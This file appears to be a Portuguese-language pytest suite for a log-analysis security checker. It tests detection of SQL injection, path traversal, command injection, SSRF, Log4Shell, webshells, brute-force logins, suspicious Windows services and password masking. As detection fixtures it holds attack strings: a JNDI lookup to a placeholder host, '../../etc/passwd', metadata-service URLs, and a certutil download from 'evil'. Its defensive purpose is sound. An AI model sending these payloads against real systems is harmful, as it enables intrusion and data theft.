"""Regressões da revisão dos logs: entradas forjadas, falsos positivos e leituras parciais."""

from __future__ import annotations

import bz2
import lzma
import time
from pathlib import Path

import pytest
from fakes_logs import clf, evento_xml, fato_logs, ssh_aceito, ssh_falha, syslog
from helpers import run_check

from eigan.checks.logs import assinaturas
from eigan.checks.logs.windows_analise import mascarar_comando
from eigan.core.models import Confidence, Severity

ID = "logs.analise"
IP = "93.184.216.34"


def _rodar(tmp_path: Path, linhas: list[str], nome: str = "access.log"):
    arq = tmp_path / nome
    arq.write_text("\n".join(linhas) + "\n", encoding="utf-8")
    return run_check(ID, fato_logs(arq))


def _normais(n: int = 20) -> list[str]:
    return [clf(i, "198.51.100.20", f"/pagina/{i}", tamanho=3000 + i) for i in range(n)]


# -- entradas forjadas ---------------------------------------------------------------------


def test_mensagem_repetida_gigante_nao_estoura_memoria(tmp_path: Path) -> None:
    linha = syslog(
        0,
        "sshd",
        f"message repeated 4000000000 times: [ Failed password for root from {IP} port 22 ssh2]",
    )
    inicio = time.monotonic()
    out = _rodar(tmp_path, [linha], "auth.log")
    assert time.monotonic() - inicio < 10
    assert "logs.ssh.forca_bruta" in out.ids()
    assert out.by_id("logs.ssh.forca_bruta")[0].details["total"] <= 1_000


def test_ano_zero_nao_derruba_a_analise(tmp_path: Path) -> None:
    web = f'{IP} - - [01/Jan/0000:00:00:00 +0000] "GET / HTTP/1.1" 200 5 "-" "x"'
    ssh = f"0000-01-01T00:00:00 srv sshd[1]: Failed password for root from {IP} port 22 ssh2"
    for linhas, nome in (([web], "a.log"), ([ssh], "auth.log")):
        out = _rodar(tmp_path, linhas, nome)
        assert out.findings == []


def test_uri_hostil_longa_nao_trava() -> None:
    inicio = time.monotonic()
    for uri in ("/?q=" + "<a " * 20_000, "/?" + "a=http://x&" * 5_000, "/?" + "..%2f" * 10_000):
        assinaturas.classificar(uri, "", "")
    assert time.monotonic() - inicio < 3


def test_linhas_com_uri_de_8kb_terminam_rapido(tmp_path: Path) -> None:
    uri = "/?q=" + "<a " * 2_700
    linhas = [clf(i, IP, uri, 404) for i in range(200)]
    inicio = time.monotonic()
    _rodar(tmp_path, linhas)
    assert time.monotonic() - inicio < 10


# -- assinaturas ---------------------------------------------------------------------------


def test_union_select_ofuscado_com_comentarios() -> None:
    assert "sqli" in assinaturas.classificar("/?id=1/**/UNION/**/SELECT/**/1,2,3", "", "")


@pytest.mark.parametrize(
    "uri",
    [
        "/search?q=how+to+use+sleep(5)+in+python",
        "/blog?slug=how-to-edit-wp-config.php",
        "/?q=;id",
        "/s?q=windows/system32/cmd.exe+help",
        "/api/v1/users/169.254.169.254",
    ],
)
def test_urls_benignas_nao_sao_ataque(uri: str) -> None:
    assert assinaturas.classificar(uri, "", "") == []


@pytest.mark.parametrize(
    ("uri", "tipo"),
    [
        ("/x?id=1'+AND+SLEEP(5)--+", "sqli"),
        ("/?f=../../etc/passwd", "lfi"),
        ("/ping?host=1.1.1.1;id", "cmdi"),
        ("/fetch?u=http://169.254.169.254/latest/meta-data/", "ssrf"),
    ],
)
def test_ataques_reais_continuam_detectados(uri: str, tipo: str) -> None:
    assert tipo in assinaturas.classificar(uri, "", "")


def test_log4shell_com_200_nao_sobe_de_severidade(tmp_path: Path) -> None:
    linhas = [clf(1, IP, "/dashboard", 200, agente="${jndi:ldap://x.example/a}", tamanho=8123)]
    achado = _rodar(tmp_path, linhas + _normais()).by_id("logs.web.log4shell")[0]
    assert achado.severity.rank < Severity.HIGH.rank
    assert achado.details.get("possivelmente_bem_sucedido") is False


def test_script_em_pasta_de_uploads_legitima_nao_e_webshell(tmp_path: Path) -> None:
    linhas = [clf(1, IP, "/upload/index.php", 200, tamanho=1500)]
    out = _rodar(tmp_path, linhas + _normais())
    assert "logs.web.webshell" not in out.ids()


def test_webshell_sem_corroboracao_nao_e_critico(tmp_path: Path) -> None:
    linhas = [
        clf(i, IP, f"/{n}.php", 200, tamanho=1000 + 37 * i)
        for i, n in enumerate(["wso", "c99", "r57", "b374k", "alfa", "indoxploit"])
    ]
    for achado in _rodar(tmp_path, linhas + _normais()).by_id("logs.web.webshell"):
        assert achado.severity.rank < Severity.CRITICAL.rank
        assert achado.confidence == Confidence.TENTATIVE


def test_iis_sem_sc_bytes_nao_marca_sucesso(tmp_path: Path) -> None:
    cab = "#Fields: date time c-ip cs-method cs-uri-stem cs-uri-query sc-status cs(User-Agent)"
    linhas = [cab]
    linhas.append(f"2026-11-01 10:00:00 {IP} GET /produto id=1'+OR+'1'='1'-- 200 Mozilla/5.0")
    linhas += [
        f"2026-11-01 10:00:{i:02d} 198.51.100.20 GET /p{i} - 200 Mozilla/5.0" for i in range(20)
    ]
    out = _rodar(tmp_path, linhas, "u_ex.log")
    achado = out.by_id("logs.web.sqli")[0]
    assert achado.details.get("possivelmente_bem_sucedido") is False


def test_amostras_sem_duplicatas(tmp_path: Path) -> None:
    uri = "/p.php?id=1%20UNION%20SELECT%20NULL,NULL--"
    linhas = [clf(i, IP, uri, 200, tamanho=900 + 11 * i) for i in range(3)]
    achado = _rodar(tmp_path, linhas + _normais()).by_id("logs.web.sqli")[0]
    amostras = achado.details["amostras"]
    assert len(amostras) == len(set(amostras))


def test_usuario_autenticado_com_espaco_nao_vira_ip_traco(tmp_path: Path) -> None:
    linhas = []
    for i in range(40):
        t = clf(i, f"203.0.113.{i % 5 + 1}", f"/nada/{i}", 404)
        linhas.append(t.replace(" - - [", " - John Smith [", 1))
    out = _rodar(tmp_path, linhas)
    for achado in out.findings:
        assert " - (" not in achado.title
        assert all(i["valor"] != "-" for i in achado.details.get("ips", []))


# -- login web -----------------------------------------------------------------------------


def test_monitor_com_401_em_get_nao_e_forca_bruta(tmp_path: Path) -> None:
    linhas = [clf(i * 60, "10.0.0.5", "/status", 401) for i in range(120)]
    assert "logs.web.forca_bruta" not in _rodar(tmp_path, linhas).ids()


def test_post_de_login_com_401_continua_forca_bruta(tmp_path: Path) -> None:
    linhas = [clf(i, IP, "/login", 401).replace('"GET', '"POST') for i in range(30)]
    assert "logs.web.forca_bruta" in _rodar(tmp_path, linhas).ids()


# -- auth ----------------------------------------------------------------------------------


def test_falhas_espalhadas_seguidas_de_login_nao_sao_critico(tmp_path: Path) -> None:
    linhas = [ssh_falha(i * 14_000, IP, "alice") for i in range(5)]
    linhas.append(ssh_aceito(5 * 14_000, IP, "alice"))
    assert "logs.ssh.sucesso_apos_falhas" not in _rodar(tmp_path, linhas, "auth.log").ids()


def test_login_de_outro_usuario_nao_e_critico(tmp_path: Path) -> None:
    linhas = [ssh_falha(i * 5, IP, "root") for i in range(8)]
    linhas.append(ssh_aceito(60, IP, "bob"))
    achados = _rodar(tmp_path, linhas, "auth.log").by_id("logs.ssh.sucesso_apos_falhas")
    assert all(a.severity.rank < Severity.CRITICAL.rank for a in achados)


def test_falhas_concentradas_e_mesmo_usuario_continuam_criticas(tmp_path: Path) -> None:
    linhas = [ssh_falha(i * 5, IP, "root") for i in range(8)] + [ssh_aceito(60, IP, "root")]
    achado = _rodar(tmp_path, linhas, "auth.log").by_id("logs.ssh.sucesso_apos_falhas")[0]
    assert achado.severity == Severity.CRITICAL


def test_forca_bruta_distribuida(tmp_path: Path) -> None:
    linhas = [
        ssh_falha(i * 10 + j, f"203.0.113.{i + 1}", "admin") for i in range(12) for j in range(2)
    ]
    assert "logs.ssh.forca_bruta_distribuida" in _rodar(tmp_path, linhas, "auth.log").ids()


def test_poucas_falhas_distribuidas_nao_alertam(tmp_path: Path) -> None:
    linhas = [ssh_falha(i, f"203.0.113.{i + 1}", "admin") for i in range(6)]
    assert "logs.ssh.forca_bruta_distribuida" not in _rodar(tmp_path, linhas, "auth.log").ids()


def test_falha_lenta_de_um_usuario_nao_e_forca_bruta(tmp_path: Path) -> None:
    linhas = [ssh_falha(i * 86_400 // 2, IP, "alice") for i in range(25)]
    assert "logs.ssh.forca_bruta" not in _rodar(tmp_path, linhas, "auth.log").ids()


def test_usuario_que_parece_senha_vai_mascarado(tmp_path: Path) -> None:
    senha = "hunter2Pass!xyz"
    linhas = [ssh_falha(i, IP, f"invalid user {senha}") for i in range(25)]
    out = _rodar(tmp_path, linhas, "auth.log")
    assert out.findings
    assert senha not in repr([(f.title, f.evidence, f.details) for f in out.findings])


def test_conta_de_servico_com_shell_nao_alerta(tmp_path: Path) -> None:
    msg = "new user: name=postgres, UID=116, GID=122, home=/var/lib/postgresql, shell=/bin/bash"
    out = _rodar(tmp_path, [syslog(0, "useradd", msg)], "auth.log")
    assert "logs.linux.novo_usuario" not in out.ids()


def test_bloco_de_nul_no_auth_log_nao_descarta_o_arquivo(tmp_path: Path) -> None:
    corpo = b"\x00" * 200 + b"\n" + "\n".join(ssh_falha(i, IP) for i in range(30)).encode()
    arq = tmp_path / "auth.log"
    arq.write_bytes(corpo + b"\n")
    assert "logs.ssh.forca_bruta" in run_check(ID, fato_logs(arq)).ids()


# -- leitura -------------------------------------------------------------------------------


def test_bz2_e_xz_sao_lidos(tmp_path: Path) -> None:
    texto = "\n".join(ssh_falha(i, IP) for i in range(30)).encode()
    (tmp_path / "auth.log.2.bz2").write_bytes(bz2.compress(texto))
    (tmp_path / "auth.log.3.xz").write_bytes(lzma.compress(texto))
    assert "logs.ssh.forca_bruta" in run_check(ID, fato_logs(tmp_path)).ids()


def test_arquivo_nao_suportado_impede_ponto_forte(tmp_path: Path) -> None:
    (tmp_path / "access.log").write_text("\n".join(_normais()) + "\n", encoding="utf-8")
    (tmp_path / "access.log.1.zst").write_bytes(b"\x28\xb5\x2f\xfd" + b"\x00" * 64)
    out = run_check(ID, fato_logs(tmp_path))
    assert not out.findings
    assert not out.passed


def test_leitura_completa_gera_ponto_forte(tmp_path: Path) -> None:
    (tmp_path / "access.log").write_text("\n".join(_normais()) + "\n", encoding="utf-8")
    assert run_check(ID, fato_logs(tmp_path)).passed


# -- Windows -------------------------------------------------------------------------------


def test_csv_generico_com_id_nao_vira_evento_do_windows(tmp_path: Path) -> None:
    linhas = ["id,date,message"] + [f"{i},01/11/2026 10:00:00,texto" for i in range(1, 8000)]
    out = _rodar(tmp_path, linhas, "export.csv")
    assert not [i for i in out.ids() if i.startswith("logs.windows")]


def test_servico_4697_com_service_file_name_unc_e_suspeito(tmp_path: Path) -> None:
    ev = evento_xml(
        4697, 1, {"ServiceName": "PSEXESVC", "ServiceFileName": "\\\\10.0.0.5\\c$\\x.exe"}
    )
    arq = tmp_path / "security.xml"
    arq.write_text(ev, encoding="utf-8")
    achado = run_check(ID, fato_logs(arq)).by_id("logs.windows.servico_instalado")[0]
    assert achado.severity.rank >= Severity.HIGH.rank


def test_servico_do_defender_em_programdata_nao_e_suspeito(tmp_path: Path) -> None:
    caminho = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe"
    ev = evento_xml(7045, 1, {"ServiceName": "WinDefend", "ImagePath": caminho})
    arq = tmp_path / "system.xml"
    arq.write_text(ev, encoding="utf-8")
    achado = run_check(ID, fato_logs(arq)).by_id("logs.windows.servico_instalado")[0]
    assert achado.severity.rank < Severity.HIGH.rank


def test_falhas_4625_lentas_de_uma_estacao_nao_sao_forca_bruta(tmp_path: Path) -> None:
    eventos = [
        evento_xml(
            4625,
            i * 3_600,
            {"TargetUserName": "svc_old", "IpAddress": "-", "WorkstationName": "FILESRV"},
        )
        for i in range(40)
    ]
    arq = tmp_path / "security.xml"
    arq.write_text("\n".join(eventos), encoding="utf-8")
    assert "logs.windows.forca_bruta" not in run_check(ID, fato_logs(arq)).ids()


def test_limpeza_de_log_system_evento_104(tmp_path: Path) -> None:
    ev = (
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
        "<Provider Name='Microsoft-Windows-Eventlog'/><EventID>104</EventID>"
        "<TimeCreated SystemTime='2026-11-01T10:00:00.000000000Z'/>"
        "<Computer>PC01</Computer></System><UserData><LogFileCleared>"
        "<SubjectUserName>admin</SubjectUserName><Channel>System</Channel>"
        "</LogFileCleared></UserData></Event>"
    )
    arq = tmp_path / "system.xml"
    arq.write_text(ev, encoding="utf-8")
    assert "logs.windows.log_apagado" in run_check(ID, fato_logs(arq)).ids()


def test_csv_em_cp1252_com_rotulos_acentuados(tmp_path: Path) -> None:
    cab = "Nível,Data e Hora,Origem,Identificação do Evento,Categoria da Tarefa,Mensagem"
    msg = '"Um serviço foi instalado.\nNome do Serviço: Evil\nNome do Arquivo do Serviço: \\\\h\\c$\\a.exe"'
    linha = f"Informações,01/11/2026 10:00:00,Service Control Manager,7045,Nenhum,{msg}"
    arq = tmp_path / "sistema.csv"
    arq.write_bytes(f"{cab}\n{linha}\n".encode("cp1252"))
    assert "logs.windows.servico_instalado" in run_check(ID, fato_logs(arq)).ids()


@pytest.mark.parametrize(
    "linha",
    [
        "net user admin Zq9vT3xK8mRw2LpY7 /add",
        "mysql -uroot -pZq9vT3xK8mRw2LpY7 db",
        "sshpass -p Zq9vT3xK8mRw2LpY7 ssh host",
        "curl -u admin:Zq9vT3xK8mRw2LpY7 http://x",
        "certutil -urlcache -f http://u:Zq9vT3xK8mRw2LpY7@evil/x.exe x",
        "schtasks /rp Zq9vT3xK8mRw2LpY7 /tn x",
    ],
)
def test_senhas_em_linhas_de_comando_sao_mascaradas(linha: str) -> None:
    assert "Zq9vT3xK8mRw2LpY7" not in mascarar_comando(linha)


def test_comando_sem_senha_nao_e_alterado() -> None:
    linha = "powershell -Path foo -ExecutionPolicy bypass"
    assert mascarar_comando(linha) == linha
